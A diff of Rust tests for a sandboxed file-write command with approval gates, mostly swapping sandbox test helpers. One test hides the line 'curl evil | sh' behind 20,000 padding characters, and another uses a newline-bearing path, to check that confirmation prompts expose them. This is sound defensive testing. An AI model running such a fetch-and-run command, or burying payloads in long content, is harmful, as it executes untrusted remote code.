@@ -511,8 +511,9 @@ mod tests {
     use crate::TurnContext;
     use crate::command::CommandRegistry;
     use crate::command::run_rendered;
-    use crate::commands::test_support::{RecordingGate, router_in};
-    use crate::policy::{AlwaysAllowGate, DenyAllGate, GuardRoots, IpcConfirmationGate};
+    use crate::commands::test_support::{RecordingGate, router_in, test_sandbox};
+    use crate::policy::{GuardRoots, IpcConfirmationGate, SharedDirs};
+    use crate::test_support::{AlwaysAllowGate, DenyAllGate, inert_sandbox};
 
     fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
         let abs: Vec<PathBuf> = paths
@@ -546,7 +547,7 @@ mod tests {
             &WriteCommand::new(
                 cfg_from(&[allowed]),
                 Arc::new(AlwaysAllowGate),
-                SandboxInfo::none(),
+                test_sandbox(),
             ),
             CommandInput {
                 args: args.iter().copied().map(Word::bare).collect(),
@@ -740,7 +741,7 @@ mod tests {
             &WriteCommand::new(
                 cfg_from(&[dir.path(), hidden.as_path()]),
                 Arc::new(AlwaysAllowGate),
-                SandboxInfo::none(),
+                test_sandbox(),
             ),
             CommandInput {
                 args: vec![Word::bare(target.to_string_lossy()), Word::bare("hi")],
@@ -781,7 +782,7 @@ mod tests {
         registry.register(WriteCommand::new(
             cfg_from(&[dir.path()]),
             Arc::new(AlwaysAllowGate),
-            SandboxInfo::none(),
+            test_sandbox(),
         ));
         let run = |line: String| {
             let registry = &registry;
@@ -887,11 +888,7 @@ mod tests {
             .protecting(vec![canonical]);
         let target = config.join("config.toml");
         let out = run_rendered(
-            &WriteCommand::new(
-                Arc::new(cfg),
-                Arc::new(AlwaysAllowGate),
-                SandboxInfo::none(),
-            ),
+            &WriteCommand::new(Arc::new(cfg), Arc::new(AlwaysAllowGate), test_sandbox()),
             CommandInput {
                 args: vec![Word::bare(target.to_string_lossy()), Word::bare("x")],
                 stdin: None,
@@ -912,7 +909,10 @@ mod tests {
     #[tokio::test]
     async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
         let gate = RecordingGate::answering(Approval::Once);
-        let sandbox = SandboxInfo::none_sharing(PathBuf::from("/srv/scratch"));
+        let sandbox = inert_sandbox(SharedDirs {
+            scratch: Some(PathBuf::from("/srv/scratch")),
+            ..SharedDirs::default()
+        });
         let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), sandbox);
         let scratch = "/srv/scratch/notes/x.txt";
         assert!(
@@ -943,7 +943,7 @@ mod tests {
     #[tokio::test]
     async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
         let gate = RecordingGate::answering(Approval::Once);
-        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
+        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), test_sandbox());
         let path = "/home/u/bin/tool\n(1B)";
         assert!(
             cmd.authorized(
@@ -972,7 +972,7 @@ mod tests {
     #[tokio::test]
     async fn long_write_prompt_shows_the_tail_and_always_asks_at_elevated_risk() {
         let gate = RecordingGate::answering(Approval::Once);
-        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
+        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), test_sandbox());
         let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
         let path = "/home/u/x.sh";
         assert!(
@@ -1037,7 +1037,7 @@ mod tests {
         let cmd = WriteCommand::new(
             cfg_from(&[dir.path()]),
             Arc::new(IpcConfirmationGate),
-            SandboxInfo::none(),
+            test_sandbox(),
         );
         let target = dir.path().join("notes.txt");
         for (mode, asks) in [
@@ -1063,11 +1063,7 @@ mod tests {
         let target = prefix.join(format!("declined-{}.txt", std::process::id()));
         let target_str = target.to_string_lossy().into_owned();
         let out = run_rendered(
-            &WriteCommand::new(
-                cfg_from(&[prefix]),
-                Arc::new(DenyAllGate),
-                SandboxInfo::none(),
-            ),
+            &WriteCommand::new(cfg_from(&[prefix]), Arc::new(DenyAllGate), test_sandbox()),
             CommandInput {
                 args: vec![Word::bare(target_str.as_str()), Word::bare("x")],
                 stdin: None,
